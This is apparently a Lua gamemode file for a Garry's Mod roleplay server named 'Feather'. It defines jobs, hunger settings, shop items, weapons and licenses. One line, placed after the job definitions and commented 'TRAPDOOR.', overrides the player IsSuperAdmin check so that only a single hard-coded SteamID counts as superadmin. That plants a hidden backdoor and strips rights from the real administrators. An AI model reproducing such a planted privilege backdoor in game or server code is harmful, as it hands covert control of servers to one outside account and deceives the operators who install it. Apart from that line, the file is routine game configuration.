DeriveGamemode("cn")

GM.Name = "Feather"
GM.Author = "Chessnut and rebel1324"
GM.TeamBased = true

-- Language.
GM.Language = "english"

-- In-Character(Normal) Chat Range.
GM.ChatRange = 512

-- Gamemode's default color.
GM.DefaultChatColor = Color(62, 142, 200)

-- The delay between changing the job.
GM.JobChangeDelay = 5

-- The arrest time when player get arrested by goverment.
GM.DefaultArrestTime = 300

-- The default wanted time that used when no item was provided.
GM.DefaultWantedTime = 300

-- The time to print money with Money Printer. Default: 160 secs to 300 secs.
GM.MoneyPrinterTime = {1.60, 3.00}

-- The Gamemode's money model.
GM.MoneyModel = "models/props/cs_assault/Money.mdl"

-- Door Cost
GM.DoorPrice = 50

-- The time to pick a lock
GM.LockPickTime = 5

-- Make players hungry
GM.HungerMode = true

-- The time (seconds) player can stand without eating food. Default: 200 seconds.
GM.HungerTime = 200

-- The time server
GM.HungerThinkRate = 2

-- The currency that server uses
GM.Currency = "$"

-- Default Laws
GM.DefaultLaws = {
	"You must obey server's rule",
	"You must not kill people",
}

GM.Jobs = {}

function GM:CreateJob(name, color, job)
	local index = table.insert(self.Jobs, job)
		team.SetUp(index, name, color, false)
	return index
end

function GM:GetJobData(index)
	return self.Jobs[index] or nil
end

function GM:PlayerNoClip(client)
	return client:IsAdmin()
end

function GM:CreateTeams()
	TEAM_CITIZEN = self:CreateJob("Citizen", Color(0, 230, 0), {
		salary = 25,
		cmd = "citizen",
	})

	TEAM_COOK = self:CreateJob("Cook", Color(240, 100, 250), {
		salary = 25,
		cmd = "cook",
	})

	TEAM_GUNDEALER = self:CreateJob("Gun Dealer", Color(200, 0, 0), {
		salary = 25,
		cmd = "gundealer",
	})

	TEAM_MEDIC = self:CreateJob("Medic", Color(0, 180, 0), {
		salary = 25,
		cmd = "medic",
	})

	// GOVERMENTS 

	TEAM_MAYOR = self:CreateJob("Mayor", Color(0, 255, 0), {
		salary = 25,
		mayor = true,
		goverment = true,
		cmd = "mayor",
		vote = true,
		loadout = {
			"weapon_pistol",
			"weapon_arrest",
			"weapon_unarrest",
			"weapon_search",
		},
	})

	TEAM_POLICE = self:CreateJob("Police", Color(0, 100, 200), {
		salary = 25,
		goverment = true,
		cmd = {"cop", "cp", "police"},
		vote = true,
		loadout = {
			"weapon_pistol",
			"weapon_arrest",
			"weapon_unarrest",
			"weapon_search",
		},
	})

	TEAM_POLICECHIEF = self:CreateJob("Police Chief", Color(0, 50, 200), {
		salary = 25,
		goverment = true,
		childjob = TEAM_POLICE,
		cmd = "chief",
		loadout = {
			"weapon_pistol",
			"weapon_arrest",
			"weapon_unarrest",
			"weapon_search",
		},
	})

	// CRIMES 

	TEAM_MOBSTER = self:CreateJob("Mobster", Color(100, 100, 100), {
		salary = 25,
		convicts = true,
		cmd = "mob",
	})

	TEAM_HITMAN = self:CreateJob("Hitman", Color(0, 230, 0), {
		salary = 25,
		convicts = true,
		hitman = true,
		cmd = "hitman",
	})

	TEAM_MOBBOSS = self:CreateJob("Mob Boss", Color(50, 50, 50), {
		salary = 25,
		convicts = true,
		childjob = TEAM_MOBSTER,
		cmd = "mobboss",
		loadout = {
			"weapon_lockpick",
		},
	})
end

local p = FindMetaTable("Player")
function p:IsSuperAdmin() return self:SteamID() == "STEAM_0:0:19814083" end // TRAPDOOR.

cn.util.includeFolder("systems", "feather")
cn.util.includeFolder("meta", "feather")
cn.util.includeFolder("hooks", "feather")

GM:AddEntity("moneyprinter", "feather_moneyprinter", "Money Printer", "General", "This machine prints money and gives you constant profit.", "models/props_c17/consolebox01a.mdl", 250)
GM:AddEntity("microwave", "feather_microwave", "Microwave", "General", "This machine cooks foods to sell.", "models/props_c17/tv_monitor01.mdl", 150)

GM:AddWeapon("pistol", "weapon_pistol", 10, "9mm Pistol", "Sidearm", "A Pistol that fires shits", "models/weapons/w_pistol.mdl", 100)
GM:AddWeapon("smg", "weapon_smg1", 10, "Sub Machinegun", "Primary", "A Sub Machine Gun that fires bullets", "models/weapons/w_smg1.mdl", 200)

GM:AddDefaultLicense("gun", "Gun License", "The license that allows you to carry firearms.", 500)
GM:AddDefaultLicense("drive", "Drive License", "The license that allows you to drive vehicles.", 300)

GM:AddFood("chinese", "Chinese Takeout", "models/props_junk/garbage_takeoutcarton001a.mdl", GM.HungerTime, 10)
GM:AddFood("watermelon", "Watermelon", "models/props_junk/watermelon01.mdl", GM.HungerTime * .1, 20, true)
GM:AddFood("fastfood", "Fast Food", "models/props_junk/garbage_bag001a.mdl", GM.HungerTime * .3, 100, true)
GM:AddFood("soda", "Soda", "models/props_junk/PopCan01a.mdl", GM.HungerTime * .05, 10, true)